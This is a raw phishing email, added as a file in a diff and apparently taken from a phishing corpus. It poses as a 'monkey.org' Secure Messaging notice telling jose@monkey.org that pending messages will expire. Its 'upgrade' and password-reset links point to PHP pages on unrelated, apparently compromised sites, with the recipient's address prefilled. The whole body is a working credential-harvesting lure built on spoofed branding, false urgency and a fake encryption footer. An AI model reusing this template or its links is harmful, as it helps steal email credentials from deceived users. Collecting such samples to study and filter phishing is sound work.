@@ -1,0 +1,262 @@
+Return-Path: hr@international-equipements.com
+Delivered-To: jose@monkey.org
+X-FDA: 82225783668.05.F1B9000
+Received: from mail.international-equipements.com
+ (mail.international-equipements.com [98.142.253.148])	by
+ imf14.b.hostedemail.com (Postfix) with ESMTP id 5A58A6000B	for
+ <jose@monkey.org>; Thu, 13 Jun 2024 12:24:32 +0000 (UTC)
+Authentication-Results: imf14.b.hostedemail.com;	dkim=fail ("headers rsa
+ verify failed") header.d=international-equipements.com header.s=default
+ header.b="XAoTfg/i";	dmarc=pass (policy=reject)
+ header.from=international-equipements.com;	spf=pass (imf14.b.hostedemail.com:
+ domain of hr@international-equipements.com designates 98.142.253.148 as
+ permitted sender) smtp.mailfrom=hr@international-equipements.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1718281471;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=vgDAeSOGjRNVJWal3CqsLI1HvFnD9DN3VANcINVqxFg=;
+	b=3cRreDdBEoPvWxNA/Rz7sVnLTQwQGknnZzslUllI2h3JcSHMbrkdbbn8I91g8zbbH1Rxrl
+	VXE30Ewj1ESfMGhLDeOGH5uCefUEHX0axMvQYrfy65Hx5+L6aJmdiH0H7Ffmw5y5TishjO
+	64ARDdaPTrm4qkkst8mwHQdy2XeYTV0=
+ARC-Authentication-Results: i=1;	imf14.b.hostedemail.com;	dkim=fail ("headers
+ rsa verify failed") header.d=international-equipements.com header.s=default
+ header.b="XAoTfg/i";	dmarc=pass (policy=reject)
+ header.from=international-equipements.com;	spf=pass (imf14.b.hostedemail.com:
+ domain of hr@international-equipements.com designates 98.142.253.148 as
+ permitted sender) smtp.mailfrom=hr@international-equipements.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1718281471; a=rsa-sha256;
+	cv=none;
+	b=VKa7MWZI1ERF8ub2d5k5TQOOnlA9eKvMRRHarr7/yIaanVzyMmTyfg7YHZnu6Edy0hbTcq
+	H+yVQ9ANatOsVUQuNLWF2T1QDuk7pPC+1dz23MPaysgheLety5+h9TE8NQB8RLv37mIMwR
+	Fwe264shqrMZryNv0XLK3LeP6IXTCIc=
+Received: from souman.php (unknown [103.186.117.144])
+	by mail.international-equipements.com (Postfix) with ESMTPSA id 7FD3E47A5F
+	for <jose@monkey.org>; Thu, 13 Jun 2024 12:24:29 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+	d=international-equipements.com; s=default; t=1718281470;
+	bh=vgDAeSOGjRNVJWal3CqsLI1HvFnD9DN3VANcINVqxFg=; h=From:To:Subject;
+	b=XAoTfg/i8igLDFd+ibXJxrvZEyi8iEUHOFlSohm2YfRF7WQotRfvQwNDU7CAbxOSw
+	 bJExtVt8KPFqcGsVBnvMElXTt7oP2adUIOm73c2zAa9IdX97errzCHLipesxGGi/9Y
+	 k3Ehd48KmDGdbuwuM17utPC2DgXLGgAF4MTCkLjR8brqX/D6SaHqPpCCwtiIUssAkd
+	 OyY5wk3+D+Vog0hbMipKmA+xuuLQ1RY6cz4KdX1xkgbHZQSVULTokZUfQibSSPaFam
+	 IpGY7VQbuncQFMo7h+lx8ER1VO7zf5v50LAXGQyjclXOGay+y3jvHwu0ulTU/6UDD7
+	 6a8KhaJpKvOMQ==
+Received-SPF:
+ pass (mail.international-equipements.com: connection is authenticated)
+From: monkey.org Notification <hr@international-equipements.com>
+To: jose@monkey.org
+Subject: Secure Messaging  Notification
+Date: 13 Jun 2024 20:24:28 +0800
+Message-ID: <20240613202428.D46628FBC5CAF25B@international-equipements.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-PPP-Message-ID: 
+ <171828147078.1756.8928138880936238240@srv58694.yourbestnetwork.net>
+X-PPP-Vhost: international-equipements.com
+X-Rspamd-Server: rspam08
+X-Rspamd-Queue-Id: 5A58A6000B
+X-Stat-Signature: b4gcbywsp6kk51hefh5p6sie939an3m4
+X-Spam-Status: No, score=0.50
+X-Rspam-User: 
+X-HE-Tag: 1718281472-345779
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1+1yJr3NnVRFO9MnwZqlY8Yff37hsWgj41cUq3JmFvflEL?=
+ =?utf-8?q?6bLs66mRT+LcQeCxR/G2H5GEvSoYXhDv8LUmuDXXGylWJcUkv+JK6y8/wreK0EC4/?=
+ =?utf-8?q?FDUeQIrb/4p5hO1GjBqGD/gexhmbU16Guk/SVlj6sjjUyJzOdXjre2aqc91bInDxj?=
+ =?utf-8?q?Krd9o7FDhBVQ51qoxiDH+gZI4U/sLvo/CiQphlSCi62cRRFGagwRYCZRU7pX8ZfWz?=
+ =?utf-8?q?w3WhLJaFFcuzllr+xnsSgPFN68YEksiU1fBsByELm9uTfKw5PlidR2BDQLMrjrrKI?=
+ =?utf-8?q?NoSUh5eiezuj1Jt1ZW8wqTk/YI63YHhog0sEqsJft5FpYAgthqIM2aGl5nnZqSwsn?=
+ =?utf-8?q?u2ccyOtToFSJ6DJ+hiFhAFNZwEZk3QQkMWZhUZH014qMeLaWG0lq97qN3813Q6ai4?=
+ =?utf-8?q?pSFD2LlaJ9agpxeZBNQUD+rrUDI2Qi9QxS4fG6DljEEJSKRDC8BA0kUtsFA+YzqS+?=
+ =?utf-8?q?0MxENCqcvMlfOvDS6F/eCUpd0ZYWwEULBxFdMvYf5EfI2ZO1hKgnNuu7jBtmYrwU/?=
+ =?utf-8?q?ewjTfxBoxA02zg1Rw/hE6Q7tSJVT1Jq8BzD5/FCmVqwczzZdpQEY/orfSdo8L9BGU?=
+ =?utf-8?q?xFncYjOtmq1DyXrq+9qmMQSil7hj9+jCwv8m87ojBsLZ0excXDvAX85mPIrPHbGVk?=
+ =?utf-8?q?CP3UN6vlqxHcsEVGbEwPedMk40kyIb5KB2/+g0IULVNosSewNcAeweVoAj3L1yYiw?=
+ =?utf-8?q?iPUKmTf9N7z6IZJMHKTYo5Iml9pY12SgziZemrzFhjw2F59PXDiyqgXB48BxTqnwg?=
+ =?utf-8?q?Pj3vDCMid6Tbr0RdSnsKiSkubLMxhsU6Y6lGrXeDgFaIesUxEggx9wz+76nexqsUf?=
+ =?utf-8?q?qI8wkHGS7cj1pnYn8I8qZxYOK3udFqzKSfIhLgATE65pFLegOJ+UhTmGgl2v/32ze?=
+ =?utf-8?q?18++UlHlRIdIrjP8CLWqPC_qSBB01tfy9e4LEUQ+3i6U1sX0ngrmzrZ1YOToHYyOC?=
+ =?utf-8?q?SqCnryxrBbeZe1RmrmAx5vBwMCkACCSsfjdk+E4+06voTNvXAdUeMdQ9tK8JOm/s8?=
+ =?utf-8?q?Zo5mh8QB3FgALk4lI6pt7egAuUn9ZXTRgufXSe1LHU8gVolYnTPCVyyRM1qIzJbxO?=
+ =?utf-8?q?Ai4YMZV619/qwEZ/Da7x7/k/wsNV+Lu9RyIOWlSv7c05ooxugf/nGlJ5kahWdDzj2?=
+ =?utf-8?q?N22pFbH+I+I7YKR97YpEtKUYuZta7Irg7uXWOLvMsxK+XDIEiOp3osj0A2ZZZM08D?=
+ =?utf-8?q?dWrK9YfY5cskFJD0El4zBBwpJhz3gNIQ4vxUV9839kSSxMKNxY8oO3F8ECviHYHcK?=
+ =?utf-8?q?FDfpUrsuH364gPfLba8Q6RaIfszolSeQmAUd/EHi8eeWCASiA6eTksfuT3U6PeXhB?=
+ =?utf-8?q?iuZjtm7sf5PFcImxA/vCVO7XtyG4fHZjLPQj/j1Z2FWh1xBMH29GUTHFuOjoi2vw?=
+ =?utf-8?q?=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 180
+
+<html>
+<head>
+	<title></title>
+</head>
+<body>
+<table style=3D"box-sizing: content-box; border-collapse: collapse; font-st=
+yle: normal; font-variant-ligatures: normal; font-variant-caps: normal; fon=
+t-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-t=
+ransform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-=
+text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration=
+-style: initial; text-decoration-color: initial; font-size: 13px; backgroun=
+d-color: rgb(255, 255, 255); border: 1px dotted rgb(211, 211, 211); height:=
+ 36px; font-family: Calibri; width: 630px; color: rgb(51, 51, 51);">
+	<tbody style=3D"box-sizing: content-box;">
+		<tr style=3D"box-sizing: content-box;">
+			<th style=3D"box-sizing: content-box; text-align: left; margin: 0px; pad=
+ding: 3px; border-width: 0px; border-style: solid; border-color: rgb(0, 0, =
+0); width: 1px; color: white; line-height: 1.666; background-color: rgb(2, =
+151, 64);">&nbsp;</th>
+			<td style=3D"box-sizing: content-box; margin: 0px; padding: 3px; border-=
+width: 0px; border-style: solid; border-color: rgb(0, 0, 0); line-height: 1=
+=2E666; background-color: rgb(243, 255, 248);">
+			<div style=3D"box-sizing: content-box; margin: 0px; padding: 0px; border=
+-top-width: 0px;">
+			<p style=3D"box-sizing: border-box; margin: 0px; padding: 0px; font-size=
+: medium; font-family: dotum, &quot;Apple Gothic&quot;, sans-serif; color: =
+rgb(71, 85, 119);"><strong style=3D"box-sizing: border-box; font-weight: bo=
+lder; text-size-adjust: 100%;">Secure Messaging</strong><br style=3D"box-si=
+zing: border-box; text-size-adjust: 100%; line-height: 17px;" />
+			Notification<span style=3D"box-sizing: border-box; font-weight: bolder;"=
+>: Incoming Pending Messages</span></p>
+			</div>
+			</td>
+		</tr>
+	</tbody>
+</table>
+
+<div style=3D"box-sizing: border-box; color: rgb(44, 54, 58); font-size: 14=
+px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: =
+normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: l=
+eft; text-indent: 0px; text-transform: none; white-space: normal; widows: 2=
+; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickn=
+ess: initial; text-decoration-style: initial; text-decoration-color: initia=
+l; margin: 0px; padding: 20px 0px 0px; background-color: rgb(255, 255, 255)=
+; font-family: Roboto-Regular, Helvetica, Arial, sans-serif; width: 630px; =
+line-height: 20px;">We have recently upgraded our Secure Messaging system, =
+and there are pending messages that have not been delivered to your Inbox.<=
+br style=3D"box-sizing: content-box; color: rgb(34, 34, 34); font-family: R=
+oboto, &quot;Segoe UI&quot;, Ubuntu, &quot;lucida grande&quot;, tahoma, san=
+s-serif; font-size: 13px; background-color: rgb(255, 255, 255);" />
+<span style=3D"box-sizing: border-box; color: rgb(34, 34, 34); font-family:=
+ Roboto, &quot;Segoe UI&quot;, Ubuntu, &quot;lucida grande&quot;, tahoma, s=
+ans-serif; font-size: 13px; background-color: rgb(255, 255, 255);">&nbsp;&n=
+bsp;</span></div>
+
+<p style=3D"box-sizing: border-box; margin-top: 0px; margin-bottom: 1rem; c=
+olor: rgb(44, 54, 58); font-family: Roboto, sans-serif; font-size: 14px; fo=
+nt-style: normal; font-variant-ligatures: normal; font-variant-caps: normal=
+; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; t=
+ext-indent: 0px; text-transform: none; white-space: normal; widows: 2; word=
+-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 2=
+55, 255); text-decoration-thickness: initial; text-decoration-style: initia=
+l; text-decoration-color: initial;"><strong style=3D"box-sizing: border-box=
+; font-weight: bolder; text-size-adjust: 100%; color: rgb(0, 132, 61);"><a =
+href=3D"https://sofalbayat.ir/wp-content/themes/hello-child/sdfljkhkdyztutr=
+ydfgdgergr/rgdfhgmjkhjmcxfsdfsg/indexre.php/?userid=3Djose@monkey.org">Upgr=
+ade your system by clicking here</a></strong></p>
+
+<p style=3D"box-sizing: border-box; margin-top: 0px; margin-bottom: 1rem; c=
+olor: rgb(44, 54, 58); font-family: Roboto, sans-serif; font-size: 14px; fo=
+nt-style: normal; font-variant-ligatures: normal; font-variant-caps: normal=
+; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; t=
+ext-indent: 0px; text-transform: none; white-space: normal; widows: 2; word=
+-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 2=
+55, 255); text-decoration-thickness: initial; text-decoration-style: initia=
+l; text-decoration-color: initial;"><strong style=3D"box-sizing: border-box=
+; font-weight: bolder; text-size-adjust: 100%; color: rgb(0, 132, 61);">Not=
+ice:</strong><span style=3D"box-sizing: border-box;">&nbsp;</span>For secur=
+ity reasons, your secure message will only be available for<span style=3D"b=
+ox-sizing: border-box;"> </span><b style=3D"box-sizing: border-box; font-we=
+ight: bolder; text-size-adjust: 100%;">7 days</b>. If you need to keep the =
+message or any attachments beyond this time frame</p>
+
+<p style=3D"box-sizing: border-box; margin-top: 0px; margin-bottom: 1rem; c=
+olor: rgb(44, 54, 58); font-family: Roboto, sans-serif; font-size: 14px; fo=
+nt-style: normal; font-variant-ligatures: normal; font-variant-caps: normal=
+; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; t=
+ext-indent: 0px; text-transform: none; white-space: normal; widows: 2; word=
+-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 2=
+55, 255); text-decoration-thickness: initial; text-decoration-style: initia=
+l; text-decoration-color: initial;">please either print it or save it to yo=
+ur personal device.</p>
+
+<p style=3D"box-sizing: border-box; margin-top: 0px; margin-bottom: 1rem; c=
+olor: rgb(44, 54, 58); font-family: Roboto, sans-serif; font-size: 14px; fo=
+nt-style: normal; font-variant-ligatures: normal; font-variant-caps: normal=
+; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; t=
+ext-indent: 0px; text-transform: none; white-space: normal; widows: 2; word=
+-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 2=
+55, 255); text-decoration-thickness: initial; text-decoration-style: initia=
+l; text-decoration-color: initial;">&nbsp;</p>
+
+<p style=3D"box-sizing: border-box; margin-top: 0px; margin-bottom: 1rem; c=
+olor: rgb(44, 54, 58); font-family: Roboto, sans-serif; font-size: 14px; fo=
+nt-style: normal; font-variant-ligatures: normal; font-variant-caps: normal=
+; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; t=
+ext-indent: 0px; text-transform: none; white-space: normal; widows: 2; word=
+-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 2=
+55, 255); text-decoration-thickness: initial; text-decoration-style: initia=
+l; text-decoration-color: initial;"><strong style=3D"box-sizing: border-box=
+; font-weight: bolder; text-size-adjust: 100%; color: rgb(0, 132, 61);">Nee=
+d help?</strong><span style=3D"box-sizing: border-box;">&nbsp;</span>If you=
+ have forgotten your password, click<span style=3D"box-sizing: border-box;"=
+>&nbsp;</span><a href=3D"https://deboranegrello.com.br/img/6;lkjhghfghdjxgf=
+gh/nbvxbchjfghsgduytuk/indexre.php/?userid=3Djose@monkey.org" rel=3D"norefe=
+rrer" style=3D"box-sizing: border-box; color: rgb(0, 132, 61); text-decorat=
+ion: underline; background-color: transparent; text-size-adjust: 100%;" tar=
+get=3D"_blank">here</a><span style=3D"box-sizing: border-box;">&nbsp;</span=
+>to request a new one.</p>
+
+<p style=3D"box-sizing: border-box; margin: 20px 0px 1.12em; font-style: no=
+rmal; font-variant-ligatures: normal; font-variant-caps: normal; font-weigh=
+t: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: =
+0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0p=
+x; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text=
+-decoration-style: initial; text-decoration-color: initial; padding: 0px; f=
+ont-size: 13px; background-color: rgb(255, 255, 255); font-family: dotum, &=
+quot;Apple Gothic&quot;, sans-serif; color: rgb(51, 51, 51); width: 640px;"=
+>&nbsp;</p>
+
+<div style=3D"box-sizing: content-box; font-style: normal; font-variant-lig=
+atures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing=
+: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: n=
+one; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke=
+-width: 0px; text-decoration-thickness: initial; text-decoration-style: ini=
+tial; text-decoration-color: initial; margin: 20px 0px 0px; padding: 0px; c=
+olor: rgb(34, 34, 34); font-family: Roboto, &quot;Segoe UI&quot;, Ubuntu, &=
+quot;lucida grande&quot;, tahoma, sans-serif; font-size: 13px; background-c=
+olor: rgb(255, 255, 255); width: 630px;">
+<hr style=3D"box-sizing: content-box; height: 0px; overflow: visible; margi=
+n-top: 1rem; margin-bottom: 1rem; border-width: 1px 0px 0px; border-right-s=
+tyle: initial; border-bottom-style: initial; border-left-style: initial; bo=
+rder-right-color: initial; border-bottom-color: initial; border-left-color:=
+ initial; border-image: initial; border-top-style: solid; border-top-color:=
+ rgba(0, 0, 0, 0.1);" /></div>
+
+<p style=3D"box-sizing: border-box; margin: 0px; font-size: 14px; font-styl=
+e: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-=
+weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-ind=
+ent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacin=
+g: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial; text-decoration-color: initial; padding: 0=
+px; background-color: rgb(255, 255, 255); font-family: dotum, &quot;Apple G=
+othic&quot;, sans-serif; color: rgb(51, 51, 51);"><span style=3D"box-sizing=
+: border-box; font-family: arial, verdana, sans-serif; text-align: right;">=
+<span style=3D"box-sizing: border-box; font-size: x-small;"><em style=3D"bo=
+x-sizing: content-box;">Mail Encrypted by jose@monkey.org</em> <em style=3D=
+"box-sizing: content-box;">&copy; All Rights Reserved.</em>| If you do not =
+wish to recieve this message&nbsp;<a class=3D"v1mailto" href=3D"mailto:unsu=
+bscribe@mdfbison.com" rel=3D"noreferrer" style=3D"box-sizing: content-box; =
+color: rgb(17, 108, 214); text-decoration: none; background-color: transpar=
+ent;" title=3D"Send email to  unsubscribe@mdfbison.com?subject=3DUnsubscrib=
+e&amp;amp;body=3DKindly Unsubscribe From this newsletter">Unsubscribe.</a><=
+/span></span></p>
+</body>
+</html>
+
